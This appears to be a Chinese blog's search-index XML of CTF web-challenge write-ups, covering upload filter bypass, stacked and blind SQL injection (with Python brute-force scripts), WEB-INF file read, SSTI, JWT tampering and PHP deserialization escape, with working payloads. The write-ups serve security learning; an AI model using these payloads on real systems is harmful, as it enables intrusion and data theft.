<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BabyUpload</title>
    <url>/2022/02/01/BabyUpload/</url>
    <content><![CDATA[<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>名字一看就知道是文件上传</p>
<p>老样子先随便传一些文件进去看看</p>
<p><img src="/2022/02/01/BabyUpload/1.png" alt="1"></p>
<p>传入php一句话木马发现不能有ph后缀</p>
<p>那么试试别的</p>
<p><img src="/2022/02/01/BabyUpload/2.png" alt="1"></p>
<p><img src="/2022/02/01/BabyUpload/3.png" alt="1"></p>
<p>发现jpg可以传</p>
<p>那么就是htaccess改后缀了</p>
<p>抓个包，上传个一句话木马</p>
<p><img src="/2022/02/01/BabyUpload/4.png" alt="1"></p>
<p>发现他还是被拦截了</p>
<p>因为之前jpg可以上传。那么可以猜测他拦截的是文件的内容</p>
<p>测试了一下发现‘&lt;?’不能在文件里面</p>
<p>卡在这里了</p>
<p>上网查了一下，学到了</p>
<p>可以用$_REQUEST方式传入数据查询</p>
<p><img src="/2022/02/01/BabyUpload/6.png" alt="1"></p>
<p>用html自带的script闭合中间语言用php标识把中间的语句用变成php代码，然后我门可以在下面的用post传参直接命令执行</p>
<p>试一下phpinfo</p>
<p><img src="/2022/02/01/BabyUpload/7.png" alt="1"></p>
<p>但是system好像不能用</p>
<p>我们可以show_source()来读文件</p>
<p>直接构造payload：shell=show_source(“/flag”)</p>
]]></content>
      <tags>
        <tag>GXYCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Blacklist</title>
    <url>/2022/01/30/Blacklist/</url>
    <content><![CDATA[<h1 id="Blacklist"><a href="#Blacklist" class="headerlink" title="Blacklist"></a>Blacklist</h1><p>[可以先看看之前强网杯的随便住]</p>
<p>首先进入题目：</p>
<p><img src="/2022/01/30/Blacklist/1.png" alt="1"></p>
<p>看起来是sql注入先试试看看有啥报错</p>
<p><img src="/2022/01/30/Blacklist/2.png" alt="1"></p>
<p>看起来是单引号字符型漏洞</p>
<p>测试一下他的列数</p>
<p><img src="/2022/01/30/Blacklist/3.png" alt="1"></p>
<p>4看起来不行</p>
<p>测试了一下2的时候可以正常回显</p>
<p><img src="/2022/01/30/Blacklist/4.png" alt="1"></p>
<p>所以列数是2，用select看看有没有回显的地方</p>
<p><img src="/2022/01/30/Blacklist/5.png" alt="1"></p>
<p>看到他过滤了很多东西就连命名表都过滤了但是没有过滤符号</p>
<p>但是没有过滤show所以考虑到堆叠注入</p>
<p>看一看库</p>
<p><img src="/2022/01/30/Blacklist/6.png" alt="1"></p>
<p>表：</p>
<p><img src="/2022/01/30/Blacklist/7.png" alt="1"></p>
<p>再看看FlagHere的字段：</p>
<p><img src="/2022/01/30/Blacklist/8.png" alt="1"></p>
<p>还有words字段</p>
<p><img src="/2022/01/30/Blacklist/9.png" alt="1"></p>
<p>可以看到我们的回显就是再words表里面返回的</p>
<p>就想到我们是不是可以更改表名让显示的表是flaghere这张表</p>
<p>但是上面的rename还有alterupdate啥的都被过滤了</p>
<p>被卡住了</p>
<p>上网查了一下知道这样一个骚姿势：（参考网址：<a class="link" href="https://www.cnblogs.com/gaonuoqi/p/12398554.html%EF%BC%89">https://www.cnblogs.com/gaonuoqi/p/12398554.html）<i class="fas fa-external-link-alt"></i></a></p>
<p>handler函数</p>
<p>handleropen可以打开这个表再close之前都可以改变，那我们就可以直接把flaghere这个表第一个读取</p>
<p>就可以替换掉words</p>
<p><img src="/2022/01/30/Blacklist/10.png" alt="1"></p>
<p>payload=?inject=1’;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p>
<p>得到flag</p>
]]></content>
  </entry>
  <entry>
    <title>(CISCN2019 华北赛区 Day2 Web1)Hack World</title>
    <url>/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/</url>
    <content><![CDATA[<h1 id="今天来写一下Hack-World"><a href="#今天来写一下Hack-World" class="headerlink" title="今天来写一下Hack World"></a>今天来写一下Hack World</h1><p>首先还是先进入题目：</p>
<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/2.png" alt="1"></p>
<p>提示我们我们想要的flag再表flag中的flag列中</p>
<p>我们可以猜一下payload=select flag from flag</p>
<p>先试试输入数字看看</p>
<p>发现1是</p>
<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/1.png" alt="1"></p>
<p>2是<img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/3.png" alt="1"></p>
<p>0和3就报错了</p>
<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/4.png" alt="1"></p>
<p>输入数字看一下<img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/5.png" alt="1"></p>
<p>返回了一个布尔值</p>
<p>那试试布尔盲注判断它是否返回了正常值</p>
<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/6.png" alt="1"></p>
<p>发现可以正常返回确定了是布尔盲注</p>
<p>写个脚本看看结果database是啥</p>
<p>附python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://9be95f60-1d06-4cdd-8893-5fdeecf731f3.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;)&#x27;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            a +=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j))</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>看到当前的表名字是ctftraining</p>
<p>想到我们刚刚的select flag from flag</p>
<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/7.png" alt="1"></p>
<p>会不会是空格被注释掉了，因为这些函数是可以使用的，尝试一下绕过这个空格</p>
<p>怎么绕呢，看到前面括号可以正常执行</p>
<p>试试括号绕过也就是select(flag)from(flag)</p>
<p><img src="/2022/01/31/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/8.png" alt="1"></p>
<p>可以运行</p>
<p>那就好办了因为前面说了</p>
<p>flag就在这里面</p>
<p>所以我们直接构造payload打</p>
<p>附上payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://9be95f60-1d06-4cdd-8893-5fdeecf731f3.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&#x27;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            a +=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j))</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就可以拿到flag拉</p>
]]></content>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>EasyJava</title>
    <url>/2022/02/01/EasyJava/</url>
    <content><![CDATA[<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>java类的题目没写过，还是先进去看看把</p>
<p><img src="/2022/02/01/EasyJava/3.png" alt="1"></p>
<p>不知道是啥漏洞，提示了是java应该不是sql注入</p>
<p>尝试爆破的时候发现爆出了账号密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">admin888</span><br></pre></td></tr></table></figure>

<p>登录进去看看</p>
<p><img src="/2022/02/01/EasyJava/1.png" alt="1"></p>
<p>可惜，flag不在这里，而且是送分题</p>
<p>去看看别的</p>
<p>主页下面有个help点进去看看</p>
<p><img src="/2022/02/01/EasyJava/2.png" alt="1"></p>
<p>好像有任意文件读取漏洞，但是读不到</p>
<p>试试直接进入，下载了一个文件</p>
<p>可是里面也没有什么信息，是个假的</p>
<p>这里我就不会做了因为java也没做过就去看了看大佬的wp</p>
<p>没想到请求方式也是假的用post可以直接下载</p>
<p>但是之前我已经下载过了</p>
<p>这之后涉及到一个java-web开发的一个点，因为没接触过所以这里偷抄记录一下大佬写的（<a class="link" href="https://blog.csdn.net/wy_97/article/details/78165051%EF%BC%89">https://blog.csdn.net/wy_97/article/details/78165051）<i class="fas fa-external-link-alt"></i></a></p>
<p>说是WEB-INF是javaweb应用的安全目录，如果想要访问其中的文件，必须通过web.xml</p>
<p>相互映射才能访问</p>
<p>简单来说就是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> WEB-INF主要包含一下文件或目录：</span><br><span class="line">    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">    /WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>

<p>我们可以post传入web.xml读取一下</p>
<p><img src="/2022/02/01/EasyJava/4.png" alt="1"></p>
<p>找到flag了，发现在com/wm/ctf/FlagController里面有个flag</p>
<p>读取一下class文件</p>
<p>路径就是/classes/com/wm/ctf/FlagController.class</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>

<p>POST下载文件</p>
<p><img src="/2022/02/01/EasyJava/5.png" alt="1"></p>
<p>将其中的base64编码解码就能得到了</p>
<p><img src="/2022/02/01/EasyJava/6.png" alt="1"></p>
]]></content>
      <tags>
        <tag>RoarCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>(GXYCTF2019)BabySQli</title>
    <url>/2022/01/28/GXYCTF2019-BabySQli/</url>
    <content><![CDATA[<h1 id="BabySQli"><a href="#BabySQli" class="headerlink" title="BabySQli"></a>BabySQli</h1><p>进入题目是这样：</p>
<p><img src="/2022/01/28/GXYCTF2019-BabySQli/1.png" alt="1"></p>
<p>这种题目先抓包测试</p>
<p><img src="/2022/01/28/GXYCTF2019-BabySQli/2.png" alt="1"></p>
<p>看到有提示，解码一下（需要一次base32和一次base64解码）</p>
<p>得到提示</p>
<p><img src="/2022/01/28/GXYCTF2019-BabySQli/3.png" alt="1"></p>
<p>知道这题是单引号注入</p>
<p>用wfuzz测试一下过滤</p>
<p>发现只过滤了一些=，or之类的</p>
<p>用orderby测试一下列数</p>
<p><img src="/2022/01/28/GXYCTF2019-BabySQli/4.png" alt="1"></p>
<p>发现是3列</p>
<p>因为知道是user表所以测试一下admin跟password在那一列</p>
<p><img src="/2022/01/28/GXYCTF2019-BabySQli/5.png" alt="1"></p>
<p><img src="/2022/01/28/GXYCTF2019-BabySQli/6.png" alt="1"></p>
<p>发现第二列是admin时爆的是密码错误</p>
<p>所以第二列是name第三列是密码</p>
<p>后面涉及到一个知识点：</p>
<p>大部分数据库的密码存储的时候是按照md5（）编码的</p>
<p>所以这里只需要你的密码的md5的值跟第三列相同就可以插入这个账号密码登录</p>
<p>所以构造payload：</p>
<p>1’/**/union/**/select/**/1,’admin’,’202cb962ac59075b964b07152d234b70’#&amp;pw=123</p>
<p>得到flag：flag{0359ac43-f3e7-4ac6-8152-109ce5428190}</p>
]]></content>
      <tags>
        <tag>GXYCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020]Ez_bypass</title>
    <url>/2022/01/29/MRCTF2020-Ez-bypass/</url>
    <content><![CDATA[<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>首先进入题目看一看</p>
<p><img src="/2022/01/29/MRCTF2020-Ez-bypass/2.png" alt="1"></p>
<p>进入源码可以看到排列好的函数</p>
<p><img src="/2022/01/29/MRCTF2020-Ez-bypass/1.png" alt="1"></p>
<p>可以看出我们需要绕过这些if</p>
<p>考到了两个知识点：</p>
<p>1、MD5碰撞绕过</p>
<p>2、php弱比较</p>
<p>MD5碰撞比较好绕过</p>
<p>可以通过数组绕过（0e绕过，但是尝试了一下不知道为啥不行）</p>
<p>因为MD5无法操作数组它会将数组看成0，但是MD5之前的数又不相同所以可以直接绕过</p>
<p><img src="/2022/01/29/MRCTF2020-Ez-bypass/3.png" alt="1"></p>
<p>接下来的弱比较漏洞更好绕过了</p>
<p>他需要判断passwd为1234567</p>
<p>我们只需要传入1234567后面带字母就行了</p>
<p>因为php是一个弱类型的函数</p>
<p>而我们输入的数的第一个是1为整型所以她会把这组数据都看作整型</p>
<p>直接过滤掉a</p>
<p>就可以直接拿到flag</p>
<p><img src="/2022/01/29/MRCTF2020-Ez-bypass/4.png" alt="1"></p>
<p>$flag=”flag{cf290612-38d0-46a8-9ab8-396a0c556d2a}“</p>
]]></content>
      <tags>
        <tag>MRCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Most-Secure-Calculator</title>
    <url>/2022/01/28/Most-Secure-Calculator/</url>
    <content><![CDATA[<h1 id="计算器1"><a href="#计算器1" class="headerlink" title="计算器1"></a>计算器1</h1><p>一样先进去看一下</p>
<p><img src="/2022/01/28/Most-Secure-Calculator/1.png" alt="1"></p>
<p>进行一个简单的wfuzz测试</p>
<p>发现啥也没过滤</p>
<p>然后</p>
<p>随便输入一些数看看</p>
<p><img src="/2022/01/28/Most-Secure-Calculator/4.png" alt="1"></p>
<p>发现这里面是一个简单的命令执行所以直接执行系统命令试试</p>
<p><img src="/2022/01/28/Most-Secure-Calculator/2.png" alt="1"></p>
<p>发现可以执行基本的system命令</p>
<p>然后直接执行cat flag.txt就行拉</p>
<p><img src="/2022/01/28/Most-Secure-Calculator/3.png" alt="1"></p>
<h1 id="KCTF-WaS-mY-cAlCuLaToR-sAfE"><a href="#KCTF-WaS-mY-cAlCuLaToR-sAfE" class="headerlink" title="KCTF{WaS_mY_cAlCuLaToR_sAfE}"></a>KCTF{WaS_mY_cAlCuLaToR_sAfE}</h1>]]></content>
      <tags>
        <tag>knightctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Tetris plus</title>
    <url>/2022/02/06/Tetris-plus/</url>
    <content><![CDATA[<h1 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris-plus"></a>Tetris-plus</h1><p>进入题目：</p>
<p>发现是个游戏，先小玩一把。</p>
<p><img src="/2022/02/06/Tetris-plus/1.png" alt="1"></p>
<p>到最后也没发现啥问题</p>
<p>点点别的也都正常</p>
<p>看看源代码</p>
<p><img src="/2022/02/06/Tetris-plus/3.png" alt="1"></p>
<p>都是些不痛不痒的东西，但是包含的js非常多，都点进去看看</p>
<p>在check.js页面发现他注释了段很长的东西，之前写过的jsfuck</p>
<p><img src="/2022/02/06/Tetris-plus/2.png" alt="1"></p>
<p>直接拿去开发者页面去编译一下jsfuck</p>
<p><img src="/2022/02/06/Tetris-plus/5.png" alt="1"></p>
<p>就得到了flag拉</p>
]]></content>
      <tags>
        <tag>hgame</tag>
      </tags>
  </entry>
  <entry>
    <title>Obsfuscation Isn&#39;t Enough</title>
    <url>/2022/01/28/Obsfuscation-Isn-t-Enough/</url>
    <content><![CDATA[<h1 id="Obsfuscation-Isn’t-Enough"><a href="#Obsfuscation-Isn’t-Enough" class="headerlink" title="Obsfuscation Isn’t Enough"></a>Obsfuscation Isn’t Enough</h1><p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/4.png" alt="1"></p>
<p>猜测可能是sql注入但是不管，先看看源代码</p>
<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/1.png" alt="1"></p>
<p>发现一串很奇怪的符号其实是jsfuck</p>
<p>可以直接拿到进开发者工具中执行</p>
<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/2.png" alt="1"></p>
<p>发现其中返回了location，直接进入那个页面看看</p>
<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/3.png" alt="1"></p>
<p>直接拿到了flag</p>
]]></content>
      <tags>
        <tag>knightctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Themysteryofip</title>
    <url>/2022/02/03/Themysteryofip/</url>
    <content><![CDATA[<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>做一下题目：</p>
<p><img src="/2022/02/03/Themysteryofip/1.png" alt="1"></p>
<p>有三个子网页</p>
<p>flag以及hint</p>
<p>flag网页中回显了ip</p>
<p><img src="/2022/02/03/Themysteryofip/2.png" alt="1"></p>
<p>看看第另一个子网页，源码发现一句话</p>
<p><img src="/2022/02/03/Themysteryofip/3.png" alt="1"></p>
<p>回到flag网页中注入一下XFF</p>
<p>发现可以</p>
<p><img src="/2022/02/03/Themysteryofip/4.png" alt="1"></p>
<p>尝试一下函数发现不会执行</p>
<p><img src="/2022/02/03/Themysteryofip/9.png" alt="1"></p>
<p>试试别的方法，输入加减乘除看看有没有模板漏洞</p>
<p><img src="/2022/02/03/Themysteryofip/6.png" alt="1"></p>
<p>发现有模板漏洞</p>
<p>利用一下直接执行命令</p>
<p><img src="/2022/02/03/Themysteryofip/7.png" alt="1"></p>
<p>发现可以直接执行</p>
<p>直接执行cat /flag</p>
<p><img src="/2022/02/03/Themysteryofip/8.png" alt="1"></p>
<p>就可以拿到flag</p>
]]></content>
      <tags>
        <tag>BJDCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>cybergrabs-easyweb</title>
    <url>/2022/02/08/cybergrabs-easyweb/</url>
    <content><![CDATA[<h1 id="easy-web"><a href="#easy-web" class="headerlink" title="easy-web"></a>easy-web</h1><p>进入题目也得先看看</p>
<p><img src="/2022/02/08/cybergrabs-easyweb/1.png" alt="1"></p>
<p>啥也没有，源代码也没啥</p>
<p>抓个包看下（因为他刚进去的时候有的要等响应，抓错几次）</p>
<p><img src="/2022/02/08/cybergrabs-easyweb/2.png" alt="1"></p>
<p>可以看到我们传过去一个cookie</p>
<p>而且从服务器端回传了一个cookie的value值，我们拿到这个值直接去base64解码就可以得到了</p>
]]></content>
      <tags>
        <tag>Cyber Grabs</tag>
      </tags>
  </entry>
  <entry>
    <title>cybergrabs-rabbit</title>
    <url>/2022/02/08/cybergrabs-rabbit/</url>
    <content><![CDATA[<h1 id="rabblt"><a href="#rabblt" class="headerlink" title="rabblt"></a>rabblt</h1><p>这道题跟之前的不一样</p>
<p>在tryhackme网站里开了个攻击机</p>
<p>我们自己连连不上</p>
<p>题目提示让我们read flag.txt</p>
<p>我们可以想到可能是文件读取或者文件包含，让我们直接读到flag.txt之中的内容</p>
<p>打开之后照常先进网站看看</p>
<p><img src="/2022/02/08/cybergrabs-rabbit/2.png" alt="1"></p>
<p>发现这些没有那种类似文件包含的漏洞，</p>
<p>那么会不会是在根目录下面直接读取flag.txt</p>
<p>尝试了一下dirsearch，但是攻击机里面没有</p>
<p>但是前面题目中提示了flag应该是在flag.txt里面</p>
<p>所以我们直接读取flag.txt试试</p>
<p><img src="/2022/02/08/cybergrabs-rabbit/3.png" alt="1"></p>
<p>可以看到可以读取到flag</p>
<p>提交</p>
<p><img src="/2022/02/08/cybergrabs-rabbit/4.png" alt="1"></p>
]]></content>
      <tags>
        <tag>Cyber Grabs</tag>
      </tags>
  </entry>
  <entry>
    <title>easy_auth</title>
    <url>/2022/02/06/easy-auth/</url>
    <content><![CDATA[<h1 id="easy-auth"><a href="#easy-auth" class="headerlink" title="easy_auth"></a>easy_auth</h1><p>进去是一个注册登录框：</p>
<p><img src="/2022/02/06/easy-auth/1.png" alt="1"></p>
<p>先注册一个admin看看</p>
<p><img src="/2022/02/06/easy-auth/5.png" alt="1"></p>
<p>可以看到，admin用户是存在的</p>
<p>那么有极大的可能就是第一个就是admin</p>
<p>先随便注册一个进去先看看</p>
<p><img src="/2022/02/06/easy-auth/2.png" alt="1"></p>
<p>进入了这个页面</p>
<p>下面有个对话框可以输入内容</p>
<p>输入完会显示在网页上</p>
<p>抓个包，抓doing包试试</p>
<p><img src="/2022/02/06/easy-auth/3.png" alt="1"></p>
<p>发过来好几个包，最后一个get包里面发现了我们想要的东西，可以看到我们返回了我的ID以及用户名</p>
<p>而且我发过去的东西里面附带了一个token</p>
<p>但是我不知道这视什么解码</p>
<p>上网查了一下这种格式，非常可能是jwt的sha256解码</p>
<p>进去看看</p>
<p><img src="/2022/02/06/easy-auth/9.png" alt="1"></p>
<p>发现确实是我们返回的内容，那么我们按照之前测试的尝试修改UserName改成admin，ID改成0试试第一个是不是admin</p>
<p><img src="/2022/02/06/easy-auth/8.png" alt="1"></p>
<p>好像不太行，但是有返回值，思路应该是对的，ID试试改成1</p>
<p><img src="/2022/02/06/easy-auth/4.png" alt="1"></p>
<p>可以看到他成功返回了并且返回了flag</p>
]]></content>
      <tags>
        <tag>hgame</tag>
      </tags>
  </entry>
  <entry>
    <title>easy-serialize-php</title>
    <url>/2022/02/09/easy-serialize-php/</url>
    <content><![CDATA[<h1 id="安洵杯-easy-serialize-php"><a href="#安洵杯-easy-serialize-php" class="headerlink" title="[安洵杯]easy_serialize_php"></a>[安洵杯]easy_serialize_php</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">题目涉及到序列化漏洞的字符逃逸</span><br><span class="line">因为到后面序列化写不明白，看了一下大佬的wp</span><br><span class="line">（https://www.jianshu.com/p/8e8117f9fd0e）</span><br></pre></td></tr></table></figure>

<p>进入题目有一个链接里面是源码</p>
<p><img src="/2022/02/09/easy-serialize-php/1.png" alt="1"></p>
<p>可以看到我们现在是在index.php网页中</p>
<p>源码中提示在phpinfo里面由我们需要的东西</p>
<p>进去看看</p>
<p><img src="/2022/02/09/easy-serialize-php/2.png" alt="1"></p>
<p>找到了一个子网页，那么就优先考虑到文件读取</p>
<p>看了一圈只有最后输出的时候又个file_get_contents函数可以读取文件内容，他读取的文件内容是base64解码之后的img</p>
<p>继续跟踪一下img，发现是由image_path传送进来的，但是我们输入img的时候会被函数过滤，所以img不可控</p>
<p>找找别的方法，下面有个反序列化函数是我们可以更改的，那么我们是不是可以构造一个我们的文件来赋值给img来直接进行文件读取呢</p>
<p>首先我们读取的文件base64：ZDBnM19mMWFnLnBocA==那么我们需要读取的内容就是s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”</p>
<p>但是我上面有个过滤：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);// 在img中的所有的filter含有的字符串替换成空</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在这里面’php’,’flag’,’php5’,’php4’,’fl1g’会被替换为空</p>
<p>也就是说</p>
<p><img src="/2022/02/09/easy-serialize-php/6.png" alt="1"></p>
<p>这是我们序列化之后的结果，但是经过过滤，它就变成了</p>
<p><img src="/2022/02/09/easy-serialize-php/7.png" alt="1"></p>
<p>那么他是否可以继续执行呢？</p>
<p>这就涉及到字符串逃逸：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>因为经过过滤，把flag全部替换为空，所以序列化出现了问题，但是可以看到在替换之后<strong>s:24:” ”</strong>后面的24个字符**;s:8:”function”;s:59:”a“<strong>之后又是一个</strong>“;**直接闭合了，那么它会直接运行</p>
<p>也就是说我们可以依靠这个过滤直接构造一个img来读取到我们想要读取的文件</p>
<h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">get:f=show_image</span><br><span class="line">post_SESSION[flagflag]=&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;</span><br></pre></td></tr></table></figure>

<p>session序列化之后是这样的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:8:&quot;flagflag&quot;;s:49:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br><span class="line">过滤之后：</span><br><span class="line">a:1:&#123;s:8:&quot;&quot;;s:49:&quot;&quot;;s:1:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>过滤之后就是把<strong>a</strong>赋值给了**;s:49:””**后面就是把我们需要输入的内容赋值给img就可以拉</p>
<p>拿到页面内容：<img src="/2022/02/09/easy-serialize-php/3.png" alt="1"></p>
<p><img src="/2022/02/09/easy-serialize-php/5.png" alt="1"></p>
<p>我们直接将刚刚读取的文件名替换成这个就可以得到flag了</p>
<h3 id="最终payload："><a href="#最终payload：" class="headerlink" title="最终payload："></a>最终payload：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">get:f=show_image</span><br><span class="line">post_SESSION[flagflag]=&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>安洵杯</tag>
      </tags>
  </entry>
  <entry>
    <title>myphpsite</title>
    <url>/2022/01/28/myphpsite/</url>
    <content><![CDATA[<h1 id="My-php-site"><a href="#My-php-site" class="headerlink" title="My php site"></a>My php site</h1><p>拿到题目先看看</p>
<p>发现这是一个php网页</p>
<p>而且网页头以get方式传送了地址</p>
<p><img src="/2022/01/28/myphpsite/1.png" alt="1"></p>
<p>所以想到用伪协议来读取文件地址</p>
<p>尝试一下拿他现在的页面看看能不能读到</p>
<p><img src="/2022/01/28/myphpsite/2.png" alt="2"></p>
<p><img src="/2022/01/28/myphpsite/3.png" alt="2"></p>
<p>拿去解码一下发现可以</p>
<p>接下来尝一下php网页</p>
<p><img src="/2022/01/28/myphpsite/7.png" alt="2"></p>
<p><img src="/2022/01/28/myphpsite/4.png" alt="2"></p>
<p>代码审计一下</p>
